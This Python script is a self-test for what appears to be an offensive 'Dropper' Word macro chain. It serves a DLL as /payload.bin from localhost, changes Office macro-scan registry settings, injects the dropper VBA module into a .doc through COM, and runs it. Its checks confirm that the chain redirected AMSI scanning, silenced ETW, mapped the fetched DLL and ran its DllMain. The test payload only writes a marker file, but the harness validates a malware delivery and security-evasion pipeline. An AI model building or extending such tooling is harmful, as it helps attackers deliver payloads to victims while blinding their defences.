"""End-to-end test of the Dropper chain against a local HTTP server in real Word.

Usage: python test/dropper_selftest.py

  1. Serves test_dll_quiet.dll (marker file on DLL_PROCESS_ATTACH, no UI)
     as /payload.bin on a local port.
  2. Builds a doc with the dropper module (config patched to the local server,
     DEV_LOG = 1).
  3. Runs the chain via automation.
  4. Asserts: report shows scan=redirected, etw=silenced, dll=<nonzero base>,
     and the marker file exists (the payload's DllMain actually ran).
"""
import http.server
import os
import shutil
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path

try:
    import pythoncom
    import win32com.client
except ImportError:
    sys.stderr.write("[!] Required: pip install pywin32\n")
    sys.exit(1)

ROOT = Path(__file__).resolve().parent.parent
BAS = ROOT / "src" / "scripts" / "Dropper" / "Dropper_Standalone.bas"
DLL = ROOT / "test" / "test_dll_quiet.dll"
PAYLOAD = ROOT / "test" / "payload.bin"
SCOPE_VALUE = "MacroRuntimeScanScope"


def set_scan_scope_all():
    """Force MacroRuntimeScanScope=2 so VBE7 binds its scan pointer even for
    automation-opened docs (restored in main's finally)."""
    import winreg
    states = []
    for path in (r"Software\Policies\Microsoft\Office\16.0\Common\Security",
                 r"Software\Microsoft\Office\16.0\Common\Security"):
        try:
            k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0,
                                   winreg.KEY_READ | winreg.KEY_WRITE)
        except OSError:
            continue
        try:
            old, _ = winreg.QueryValueEx(k, SCOPE_VALUE)
        except FileNotFoundError:
            old = None
        winreg.SetValueEx(k, SCOPE_VALUE, 0, winreg.REG_DWORD, 2)
        states.append((k, old is not None, old))
    return states


def restore_scan_scope(states) -> None:
    import winreg
    for k, had, old in states:
        if had:
            winreg.SetValueEx(k, SCOPE_VALUE, 0, winreg.REG_DWORD, old)
        else:
            try:
                winreg.DeleteValue(k, SCOPE_VALUE)
            except FileNotFoundError:
                pass
        winreg.CloseKey(k)

DOC_PATH = ROOT / "test" / "dropper_selftest.doc"
MARKER = Path(os.environ.get("TEMP", r"C:\Users\itag7\AppData\Local\Temp")) / "evba_dropper_ok.txt"
LOG_PATH = ROOT / "test" / "dropper_run.log"

PORT = 18080

def ensure_test_dll():
    """Build test_dll_quiet.dll from source if absent (repo ignores binaries)."""
    if DLL.exists() and DLL.stat().st_size > 0:
        return True
    src = ROOT / "test" / "test_dll_quiet.c"
    gcc = shutil.which("gcc") or r"C:\w64devkit\bin\gcc.exe"
    if not (shutil.which(gcc) if gcc != r"C:\w64devkit\bin\gcc.exe" else os.path.exists(gcc)):
        print("[!] test_dll_quiet.dll missing and no gcc found (w64devkit expected)")
        return False
    r = subprocess.run([gcc, "-shared", "-o", str(DLL), str(src), "-Wl,--enable-stdcall-fixup"],
                       capture_output=True, text=True)
    if r.returncode != 0 or not DLL.exists():
        print(f"[!] gcc failed: {r.stderr[:300]}")
        return False
    print("[+] Built test_dll_quiet.dll")
    return True


def serve_payload():
    PAYLOAD.write_bytes(DLL.read_bytes())

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=str(ROOT / "test"), **kw)

        def log_message(self, fmt, *args):
            pass

    httpd = socketserver.TCPServer(("127.0.0.1", PORT), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def com_call_with_retry(func, retries=5, delay=1.0):
    for i in range(retries):
        try:
            return func()
        except pythoncom.com_error as e:
            if e.args[0] == -2147418111 and i < retries - 1:
                time.sleep(delay)
                continue
            raise


def build_doc(word) -> None:
    bas_code = BAS.read_text(encoding="utf-8")
    bas_code = "".join(l for l in bas_code.splitlines(keepends=True)
                       if not l.strip().startswith("Attribute VB_Name"))

    # patch config + dev logging for the local test build
    bas_code = bas_code.replace('Private Const SERVER_HOST As String = "127.0.0.1"',
                                f'Private Const SERVER_HOST As String = "127.0.0.1"')
    bas_code = bas_code.replace("Private Const SERVER_PORT As Long = 8080",
                                f"Private Const SERVER_PORT As Long = {PORT}")
    bas_code = bas_code.replace("Private Const PAYLOAD_PATH As String = \"/payload.bin\"",
                                'Private Const PAYLOAD_PATH As String = "/payload.bin"')
    bas_code = bas_code.replace("#Const DEV_LOG = 0", "#Const DEV_LOG = 1")

    for f in (DOC_PATH, LOG_PATH):
        if f.exists():
            f.unlink()
    if MARKER.exists():
        MARKER.unlink()

    doc = com_call_with_retry(lambda: word.Documents.Add())
    time.sleep(1)
    com_call_with_retry(lambda: doc.SaveAs2(str(DOC_PATH), FileFormat=0))
    time.sleep(0.5)

    vb_proj = doc.VBProject
    mod = vb_proj.VBComponents.Add(1)
    mod.Name = "RunCtx_Standalone"
    mod.CodeModule.AddFromString(bas_code)

    com_call_with_retry(lambda: doc.Save())
    time.sleep(0.5)
    com_call_with_retry(lambda: doc.Close(SaveChanges=0))
    print(f"[+] Built {DOC_PATH}")

def main():
    if not ensure_test_dll():
        return 1
    httpd = serve_payload()
    print(f"[*] Serving payload on 127.0.0.1:{PORT}/payload.bin")

    scope_state = set_scan_scope_all()
    print("[*] Scan scope forced to all documents (restored after run)")

    word = win32com.client.DispatchEx("Word.Application")
    word.Visible = False
    word.DisplayAlerts = 0
    time.sleep(2)

    ok = False
    try:
        build_doc(word)
        print("[*] Running chain...")
        word.AutomationSecurity = 1
        doc = com_call_with_retry(lambda: word.Documents.Open(str(DOC_PATH)))
        time.sleep(1)
        try:
            com_call_with_retry(lambda: word.Run("RunCtx_Standalone.Run"))
            time.sleep(1)
        except Exception as e:
            print(f"[!] Run failed: {e}")
        try:
            com_call_with_retry(lambda: doc.Close(SaveChanges=0))
        except Exception:
            pass
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            word.Quit()
        except Exception:
            pass
        httpd.shutdown()
        restore_scan_scope(scope_state)
    print()
    report = LOG_PATH.read_text().strip() if LOG_PATH.exists() else ""
    print(f"[*] Report: {report or '(none)'}")
    print(f"[*] Marker file: {'present' if MARKER.exists() else 'missing'}")

    checks = [
        ("report logged", bool(report)),
        ("stage 1 redirected", "scan=redirected" in report),
        ("stage 2 silenced", "etw=silenced" in report),
        ("dll mapped", "dll=" in report and "dll=fetch-failed" not in report and "dll=map-failed" not in report
         and not report.endswith("dll=0")),
        ("payload DllMain ran (marker file)", MARKER.exists()),
    ]
    all_ok = True
    print("[*] Checks:")
    for name, passed in checks:
        print(f"    [{'+' if passed else '!'}] {name}")
        all_ok = all_ok and passed

    # cleanup
    for f in (DOC_PATH, LOG_PATH, PAYLOAD, ROOT / "test" / "~$ropper_selftest.doc"):
        try:
            if f.exists():
                f.unlink()
        except OSError:
            pass
    if MARKER.exists():
        MARKER.unlink()

    print()
    if all_ok:
        print("[+] PASS - full chain executed end to end")
        return 0
    print("[!] FAIL")
    return 1


if __name__ == "__main__":
    sys.exit(main())
